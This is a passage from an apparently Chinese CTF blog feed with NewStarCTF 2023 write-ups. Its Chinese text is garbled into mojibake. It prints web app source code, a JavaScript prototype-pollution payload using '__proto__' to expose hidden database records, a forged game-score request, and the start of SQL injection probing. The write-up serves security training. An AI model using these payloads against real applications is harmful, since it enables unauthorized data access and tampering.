class="hljs-comment">//å°†è·å–çš„æ•°æ®è½¬åŒ–ä¸ºjsæ‰€å¯ä»¥ä½¿ç”¨çš„jsonæ•°æ®ï¼Œå¯ä»¥ç†è§£ä¸ºè½¬åŒ–ä¸ºå­—å…¸ç±»å‹çš„æ•°æ®</span><br>        <span class="hljs-keyword">const</span> data = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(jsonText);<br>        <span class="hljs-comment">//åˆ¤æ–­jsonæ•°æ®dataä¸­contactå¥æ‰€å¯¹åº”çš„valueçš„ç±»å‹ä»¥åŠreasonæ‰€å¯¹åº”å¾—ç±»å‹æ˜¯ä¸æ˜¯ä¸ºstring(å­—ç¬¦ä¸²)</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> data[<span class="hljs-string">&quot;contact&quot;</span>] !== <span class="hljs-string">&quot;string&quot;</span> || <span class="hljs-keyword">typeof</span> data[<span class="hljs-string">&quot;reason&quot;</span>] !== <span class="hljs-string">&quot;string&quot;</span>)<br>        <span class="hljs-comment">//å¦‚æœå…¶ä¸­æœ‰ä¸€ä¸ªä¼ è¾“ç±»å‹ä¸æ˜¯å­—ç¬¦ä¸²å°±è¾“å‡ºé”™è¯¯çš„å“åº”åŒ…</span><br>            <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>                <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>                <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Invalid parameter&quot;</span><br>            &#125;<br>            <span class="hljs-comment">//åˆ¤æ–­dataä¸­contactå’Œreasonæ‰€å¯¹åº”çš„å†…å®¹çš„å€¼æ˜¯å¦ä¸ºç©º</span><br>        <span class="hljs-keyword">if</span> (data[<span class="hljs-string">&quot;contact&quot;</span>].<span class="hljs-property">length</span> &lt;= <span class="hljs-number">0</span> || data[<span class="hljs-string">&quot;reason&quot;</span>].<span class="hljs-property">length</span> &lt;= <span class="hljs-number">0</span>)<br>        <span class="hljs-comment">//å¦‚æœä¸¤è€…æ‰€å¯¹åº”å¾—å†…å®¹ä¸ºç©ºï¼Œåˆ™è¿”å›é”™è¯¯å¾—å“åº”å†…å®¹ä¸»ä½“</span><br>            <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Parameters contact and reason cannot be empty&quot;</span><br>        &#125;<br><br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DEFAULT</span> = &#123;<br>                <span class="hljs-attr">date</span>: <span class="hljs-string">&quot;unknown&quot;</span>,<br>                <span class="hljs-attr">place</span>: <span class="hljs-string">&quot;unknown&quot;</span><br>            &#125;<br>            <span class="hljs-comment">//è°ƒç”¨insert2dbå‡½æ•°å°†å†…å®¹æ’å…¥åˆ°æ•°æ®åº“ä¸­</span><br>        <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">insert2db</span>(<span class="hljs-title function_">merge</span>(<span class="hljs-variable constant_">DEFAULT</span>, data));<br>        ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;success&quot;</span>,<br>            <span class="hljs-attr">data</span>: result<br>        &#125;;<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(e);<br>        ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Internal Server Error&quot;</span><br>        &#125;<br>    &#125;<br>&#125;)<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;<br></code></pre></td></tr></table></figure><p>info.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Router</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;koa-router&quot;</span>);<br><span class="hljs-keyword">const</span> router = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Router</span>();<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SQL</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./sql&quot;</span>);<br><span class="hljs-keyword">const</span> sql = <span class="hljs-keyword">new</span> <span class="hljs-title function_">SQL</span>(<span class="hljs-string">&quot;wishes&quot;</span>);<br><span class="hljs-comment">//å¼•ç”¨é…ç½®æ–‡ä»¶ï¼Œå¯ä»¥ä½¿å½“å‰ä»£ç è·å–å¼•ç”¨æ–‡ä»¶ä¸­çš„ä¿¡æ¯</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CONFIG</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;../config&quot;</span>)<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DEFAULT_CONFIG</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;../config.default&quot;</span>)<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getInfo</span>(<span class="hljs-params">timestamp</span>) &#123;<br>    <span class="hljs-comment">//å¦‚æœtimestampç±»å‹ä¸ºnumberå‹ï¼ˆæ•°å€¼å‹ï¼‰ï¼Œåˆ™è¿”å›timestampçš„å€¼ï¼Œå¦åˆ™å°±ä¸ºå½“å‰æ—¶é—´çš„å€¼</span><br>    timestamp = <span class="hljs-keyword">typeof</span> timestamp === <span class="hljs-string">&quot;number&quot;</span> ? timestamp : <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();<br>    <span class="hljs-comment">// Remove test data from before the movie was released</span><br>    <span class="hljs-comment">//è·å–æ—¶é—´æˆ³ä¿¡æ¯ï¼Œå¦‚æœCONFIG.min_public_timeçš„æ—¶é—´ä¸ºçœŸåˆ™ä»¥å®ƒä½œä¸ºå¯¹è±¡ç”³è¯·æ—¶çš„å‚æ•°</span><br>    <span class="hljs-comment">//å¦åˆ™å°±ä»¥DEFAULT_CONFIG.min_public_timeä½œä¸ºæ—¶é—´å¯¹è±¡çš„å‚æ•°ï¼Œgettime()è·å–dateç±»çš„æ—¶é—´æˆ³</span><br>    <span class="hljs-comment">//è¿™é‡Œçš„CONFIGï¼ŒDEFAULT_CONFIGéƒ½å±äºå¼•ç”¨æ–‡ä»¶ï¼Œæ‰€ä»¥è·å–çš„æ˜¯å¼•ç”¨çš„é…ç½®æ–‡ä»¶ä¸­çš„ä¿¡æ¯</span><br>    <span class="hljs-keyword">let</span> minTimestamp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-variable constant_">CONFIG</span>.<span class="hljs-property">min_public_time</span> || <span class="hljs-variable constant_">DEFAULT_CONFIG</span>.<span class="hljs-property">min_public_time</span>).<span class="hljs-title function_">getTime</span>();<br>    <span class="hljs-comment">//timestampè·å–timestampå’ŒminTimestampä¸­æœ€å¤§çš„é‚£ä¸€ä¸ªæ—¶é—´æˆ³çš„å€¼</span><br>    timestamp = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(timestamp, minTimestamp);<br>    <span class="hljs-comment">//è·å–æ•°æ®åº“ä¸­æ—¶é—´æˆ³å¤§äºtimestampçš„è®°å½•å†…å®¹</span><br>    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> sql.<span class="hljs-title function_">all</span>(<span class="hljs-string">`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp &gt;= ?`</span>, [timestamp]).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> &#123; <span class="hljs-keyword">throw</span> e &#125;);<br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br><span class="hljs-comment">//ä½¿ç”¨postè¯·æ±‚è®¿é—®/infoç½‘é¡µï¼Œ:è¡¨ç¤ºè®¿é—®è¯¥ç½‘é¡µæ—¶è·å–å‚æ•°å†…å®¹,tsä¸ºå‚æ•°éƒ¨åˆ†ï¼Œ?è¡¨ç¤ºè¯¥å‚æ•°å¯ä»¥å¡«å†™ä¹Ÿå¯ä»¥ä¸å¡«å†™</span><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/info/:ts?&quot;</span>, <span class="hljs-title function_">async</span>(ctx) =&gt; &#123;<br>    <span class="hljs-comment">//åˆ¤æ–­è¯·æ±‚å†…å®¹å¾—ç±»å‹æ˜¯ä¸æ˜¯application/x-www-form-urlencoded</span><br>    <span class="hljs-keyword">if</span> (ctx.<span class="hljs-property">header</span>[<span class="hljs-string">&quot;content-type&quot;</span>] !== <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>)<br>        <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>                <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>                <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Content-Type must be application/x-www-form-urlencoded&quot;</span><br>            &#125;<br>            <span class="hljs-comment">//è·å–è¯·æ±‚å†…å®¹ä¸­çš„å‚æ•°é›†ä¸­çš„å‚æ•°tsçš„å€¼çš„ç±»å‹</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span> === <span class="hljs-string">&quot;undefined&quot;</span>)<br>        ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span> = <span class="hljs-number">0</span> <span class="hljs-comment">//tså‚æ•°é»˜è®¤æ˜¯0</span><br>        <span class="hljs-comment">// /^[0-9]+$/.test(ctx.params.ts || &quot;&quot;):å…ˆè¿è¡Œtest()ä¸­çš„å†…å®¹ï¼Œå¦‚æœtsä¸ºç©ºåˆ™è¢«èµ‹å€¼ä¸º&quot;&quot;,åŒæ—¶åˆ¤æ–­æ˜¯å¦ç”±æ•°å­—ç»„æˆ</span><br>        <span class="hljs-comment">//å¦‚æœç”±æ•°å­—ç»„æˆçš„å­—ç¬¦ä¸²åˆ™è¿”å›Number(ctx.params.ts)ï¼Œå°†tsè½¬åŒ–ä¸ºæ•°å€¼å‹çš„ç»“æœ</span><br>        <span class="hljs-comment">//å¦‚æœä¸æ˜¯ç”±æ•°å­—ç»„æˆçš„å­—ç¬¦ä¸²ï¼Œåˆ™è¿”å›åŸæ¥tsçš„å†…å®¹</span><br>    <span class="hljs-keyword">const</span> timestamp = <span class="hljs-regexp">/^[0-9]+$/</span>.<span class="hljs-title function_">test</span>(ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span> || <span class="hljs-string">&quot;&quot;</span>) ? <span class="hljs-title class_">Number</span>(ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span>) : ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span>;<br>    <span class="hljs-comment">//å¦‚æœtimestampç±»å‹ä¸ä¸ºæ•°å€¼å‹</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> timestamp !== <span class="hljs-string">&quot;number&quot;</span>)<br>        <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Invalid parameter ts&quot;</span><br>        &#125;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getInfo</span>(timestamp).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> &#123; <span class="hljs-keyword">throw</span> e &#125;);<br>        ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;success&quot;</span>,<br>            <span class="hljs-comment">//dataä¸ºä»æ•°æ®åº“ä¸­è¿”å›çš„æ‰€æœ‰è®°å½•æ•°å†…å®¹</span><br>            <span class="hljs-attr">data</span>: data<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(e);<br>        <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Internal Server Error&quot;</span><br>        &#125;<br>    &#125;<br>&#125;)<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;<br></code></pre></td></tr></table></figure><p>æ ¹æ®info.jsçš„ä»£ç å®¡è®¡æˆ‘ä»¬éœ€è¦æŸ¥çœ‹config.jsæ–‡ä»¶å’Œconfig.default.jsæ–‡ä»¶ä¸­çš„æœ€å°æ—¶é—´ä¿¡æ¯:</p><p>config.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>    <span class="hljs-attr">app_name</span>: <span class="hljs-string">&quot;OtenkiGirl&quot;</span>,<br>    <span class="hljs-attr">default_lang</span>: <span class="hljs-string">&quot;ja&quot;</span>,<br>&#125;<br></code></pre></td></tr></table></figure><p>config.default.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>    <span class="hljs-attr">app_name</span>: <span class="hljs-string">&quot;OtenkiGirl&quot;</span>,<br>    <span class="hljs-attr">default_lang</span>: <span class="hljs-string">&quot;ja&quot;</span>,<br>    <span class="hljs-comment">//è®¾ç½®äº†min_public_timeå‚æ•°çš„å†…å®¹</span><br>    <span class="hljs-attr">min_public_time</span>: <span class="hljs-string">&quot;2019-07-09&quot;</span>,<br>    <span class="hljs-attr">server_port</span>: <span class="hljs-number">9960</span>,<br>    <span class="hljs-attr">webpack_dev_port</span>: <span class="hljs-number">9970</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å‘ç°åªæœ‰config.default.jsè®¾ç½®äº†min_public_timeå‚æ•°çš„å†…å®¹ï¼Œæ‰€ä»¥dateç±»ç”³è¯·æ—¶ä½¿ç”¨äº†config.default.jsä¸­çš„min_public_time: â€œ2019-07-09â€</p><p>åŒæ—¶æ ¹æ®åˆ†æinfo.jsæˆ‘ä»¬å¯ä»¥çŸ¥é“æˆ‘ä»¬è¾“å…¥çš„å‚æ•°tså¯ä»¥æ—¶ä»»æ„çš„ï¼Œç”¨äºè·å–æŒ‡å®šæ—¶é—´æˆ³çš„ä¿¡æ¯:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">/info/1<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231028170204727.png" alt="image-20231028170204727"></p><p>æˆ‘ä»¬å‘ç°è¿”å›çš„å†…å®¹æ˜¯æ—¶é—´æˆ³â€timestampâ€:1698483502171çš„å†…å®¹ï¼Œè¿™æ˜¯å› ä¸ºæˆ‘ä»¬è¾“å…¥çš„æ—¶é—´æˆ³ts&#x3D;1&lt;1698483502171ï¼ˆmin_public_time: â€œ2019-07-09â€ï¼‰æ‰€ä»¥è¿”å›çš„æ˜¯ç³»ç»Ÿé»˜è®¤æ—¶é—´ä¹‹ä¸Šçš„ä¿¡æ¯</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">/info/1698483502172<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231028170420211.png" alt="image-20231028170420211"></p><p>å‘ç°æ²¡æœ‰dataæ•°æ®è¿”å›ï¼Œè¿™æ˜¯å› ä¸ºæˆ‘ä»¬è¾“å…¥çš„æ—¶é—´æˆ³tså·²ç»å¤§äºç³»ç»Ÿé»˜è®¤çš„æ—¶é—´æˆ³ï¼Œæ‰€ä»¥è¿”å›æˆ‘ä»¬tsä¹‹ä¸Šçš„dataæ•°æ®è®°å½•</p><p>çŒœæµ‹:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">å½“å‰æ•°æ®åº“è¿”å›çš„å†…å®¹æ˜¯åœ¨ç³»ç»Ÿé…ç½®çš„é»˜è®¤æ—¶é—´ä¹‹ä¸Šçš„ä¿¡æ¯ï¼Œå³ç”±äºä»£ç çš„æ—¶é—´è¿‡æ»¤ï¼Œæœ€å¤šå›æ˜¾é…ç½®æ—¶é—´ä¹‹ä¸Šçš„ä¿¡æ¯ï¼Œæˆ‘ä»¬æ— æ³•æŸ¥çœ‹é…ç½®æ—¶é—´ä¹‹ä¸‹çš„æ•°æ®åº“ä¸­çš„ä¿¡æ¯ï¼Œä¹Ÿè®¸flagå°±åœ¨é…ç½®æ—¶é—´ä¹‹ä¸‹çš„è®°å½•ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ›´æ”¹é»˜è®¤é…ç½®çš„æ—¶é—´ï¼Œä½¿å…¶å˜å¾—å¾ˆå°ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æŸ¥çœ‹æ•°æ®åº“ä¸­æ›´å¤šçš„ä¿¡æ¯<br></code></pre></td></tr></table></figure><p>jsåŸå‹é“¾æ±¡æŸ“:</p><p>payload:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable constant_">POST</span> /submit <span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">1.</span>1Content-<span class="hljs-title class_">Type</span>: application/json<br><br>&#123;  <br>    <span class="hljs-string">&quot;contact&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>,  <br>    <span class="hljs-string">&quot;reason&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>,  <br>    <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;    <br>        <span class="hljs-string">&quot;min_public_time&quot;</span>: <span class="hljs-string">&quot;1001-01-01&quot;</span>  <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231028171513867.png" alt="image-20231028171513867"></p><p>è·å–æˆ‘ä»¬ä¿®æ”¹é»˜è®¤é…ç½®æ—¶é—´åæ•°æ®åº“ä¸­çš„ä¿¡æ¯(0æ˜¯æœ€å°çš„æ—¶é—´æˆ³ï¼Œæ‰€ä»¥ä¸€å®šèƒ½è¿”å›â€min_public_timeâ€: â€œ1001-01-01â€ä¹‹ä¸Šæ—¶é—´çš„ä¿¡æ¯):<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">/info/0<br><br>Content-Type:  application/x-www-form-urlencoded<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231028171757647.png" alt="image-20231028171757647"></p><p>è¿”å›äº†æ•°æ®åº“ä¸­æ›´å¤šçš„ä¿¡æ¯ï¼Œåœ¨è¿™äº›é¢å¤–çš„ä¿¡æ¯ä¸­æŸ¥æ‰¾flag:<br><img src="/images/2023-11-3-newstar-3/image-20231028171854336.png" alt="image-20231028171854336"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF 2023_ç¬¬äºŒå‘¨WP</title>
    <link href="/2023/10/09/2023-10-9-newstarweek2/"/>
    <url>/2023/10/09/2023-10-9-newstarweek2/</url>
    
    <content type="html"><![CDATA[<h1 id="NewStarCTF-2023-ç¬¬äºŒå‘¨WP"><a href="#NewStarCTF-2023-ç¬¬äºŒå‘¨WP" class="headerlink" title="NewStarCTF 2023_ç¬¬äºŒå‘¨WP"></a>NewStarCTF 2023_ç¬¬äºŒå‘¨WP</h1><h2 id="æ¸¸æˆé«˜æ‰‹"><a href="#æ¸¸æˆé«˜æ‰‹" class="headerlink" title="æ¸¸æˆé«˜æ‰‹"></a>æ¸¸æˆé«˜æ‰‹</h2><p><img src="/images/2023-10-9-Newstar-2/image-20231004153201791.png" alt="image-20231004153201791"></p><p>æœ¬é¢˜æ˜¯ä¸€é“æ¸¸æˆé¢˜ï¼ŒæŒ‰ç…§æƒ¯ä¾‹ï¼Œæˆ‘ä»¬éœ€è¦å…ˆæŸ¥çœ‹çš„js:<br><img src="/images/2023-10-9-Newstar-2/image-20231004153237481.png" alt="image-20231004153237481"></p><p>å¾—åˆ°ä¸€ä¸ªapp_v2.jsæ–‡ä»¶ï¼Œä»¥åŠæˆ‘ä»¬éœ€è¦è·å¾—100000åˆ†æ‰èƒ½æ˜¾ç¤ºflag</p><p>è®¿é—®app_v2.jsæ–‡ä»¶,æˆ‘ä»¬ç›´æ¥å®šä½åˆ°æ¸¸æˆç»“æŸæ—¶çš„å¤„ç†ä»£ç :<br><img src="/images/2023-10-9-Newstar-2/image-20231004153442164.png" alt="image-20231004153442164"></p><p>æ˜¾ç¤ºä¸€ä¸ªalertæç¤ºæ¡†ï¼Œä½¿ç”¨ctrl+få¯»æ‰¾è¯¥æç¤ºæ¡†çš„å…·ä½“ä½ç½®:<br><img src="/images/2023-10-9-Newstar-2/image-20231004153543915.png" alt="image-20231004153543915"></p><p>åœ¨è¯¥ä»£ç ä¸­æˆ‘ä»¬å‘ç°äº†api.phpæ–‡ä»¶ï¼Œå¯¹å…¶è¿›è¡Œè®¿é—®:</p><p><img src="/images/2023-10-9-Newstar-2/image-20231004153645105.png" alt="image-20231004153645105"></p><p>å¯¹jsä»£ç è¿›è¡Œä»£ç å®¡è®¡:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//æ¸¸æˆç»“æŸ</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">gameover</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">if</span>(gameScore &gt; <span class="hljs-number">100000</span>)&#123;<br>        <span class="hljs-comment">//åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„XMLHttpRequestå¯¹è±¡ã€‚XMLHttpRequestå¯¹è±¡æ˜¯ç”¨äºåœ¨åå°ä¸æœåŠ¡å™¨äº¤æ¢æ•°æ®çš„JavaScript APIã€‚å®ƒå¯ä»¥é€šè¿‡HTTPæˆ–HTTPSåè®®å‘é€HTTPè¯·æ±‚ï¼Œå¹¶æ¥æ”¶æœåŠ¡å™¨çš„å“åº”ã€‚</span><br>        <span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>        <span class="hljs-comment">//ä½¿ç”¨postè¯·æ±‚æ‰“å¼€ä¸€ä¸ªapi.phpæ–‡ä»¶ï¼Œå¹¶å½¢æˆç½‘é¡µå¯¹è±¡å­˜å‚¨åˆ°xhrä¸­</span><br>        xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;POST&quot;</span>, <span class="hljs-string">&quot;/api.php&quot;</span>, <span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//xhrç½‘é¡µå»ºç«‹ä¸€ä¸ªç½‘é¡µè¯·æ±‚å¤´Content-Typeï¼Œå†…å®¹ä¸ºapplication/json</span><br>        xhr.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/json&quot;</span>);<br>        xhr.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">if</span> (xhr.<span class="hljs-property">readyState</span> === <span class="hljs-number">4</span> &amp;&amp; xhr.<span class="hljs-property">status</span> === <span class="hljs-number">200</span>) &#123;<br>            <span class="hljs-keyword">var</span> response = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(xhr.<span class="hljs-property">responseText</span>);<br>            <span class="hljs-title function_">alert</span>(response.<span class="hljs-property">message</span>);<br>        &#125;<br>        &#125;;<br>        <span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªjsonæ•°æ®å¯¹è±¡</span><br>        <span class="hljs-keyword">var</span> data = &#123;<br>            <span class="hljs-comment">//scoreæ˜¯é”®ï¼ŒgameScoreæ˜¯value</span><br>            <span class="hljs-attr">score</span>: gameScore,<br>        &#125;;<br>        <span class="hljs-comment">//å°†jsonæ•°æ®ä¼ è¾“ç»™xhrç½‘é¡µå¯¹è±¡</span><br>        xhr.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));<br>    &#125;<br><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;æˆç»©ï¼š&quot;</span>+gameScore);<br>gameScore=<span class="hljs-number">0</span>;  <br>curPhase =<span class="hljs-variable constant_">PHASE_READY</span>;  <br>hero = <span class="hljs-literal">null</span>;<br>hero = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hero</span>();      <br>&#125;<br></code></pre></td></tr></table></figure><p>æ ¹æ®ä»£ç å®¡è®¡æˆ‘ä»¬éœ€è¦ä¼ è¾“ä¸€ä¸ªjsonæ•°æ®ç»™ç½‘é¡µï¼Œè¿™ä¸ªjsonæ•°æ®å°±æ˜¯æˆ‘ä»¬æ¸¸æˆçš„åˆ†æ•°ï¼Œä½¿ç”¨bpæŠ“åŒ…ï¼Œåœ¨api.phpæ‰€åœ¨ç½‘é¡µä¼ è¾“ä¸€ä¸ªjsonæ•°æ®:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">Content-Type:application/json<br><br>&#123;<br>   &quot;score&quot;:100000000000<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004154912262.png" alt="image-20231004154912262"></p><h2 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h2><p><img src="/images/2023-10-9-Newstar-2/image-20231004155124328.png" alt="image-20231004155124328"></p><p>æˆ‘ä»¬åœ¨urlä¸­å‘ç°å­˜åœ¨sqlæ³¨å…¥ç‚¹:<br><img src="/images/2023-10-9-Newstar-2/image-20231004155156692.png" alt="image-20231004155156692"></p><p>çŒœæµ‹å¯èƒ½æ˜¯é€šè¿‡idåœ¨æ•°æ®åº“ä¸­å¯»æ‰¾å­˜åœ¨çš„è®°å½•ç„¶åå›æ˜¾åˆ°é¡µé¢:<br>æµ‹è¯•è¯¥ç½‘é¡µæ˜¯å¦å­˜åœ¨sqlæŠ¥é”™:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=TMP0919&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-9-Newstar-2/image-20231004155327273.png" 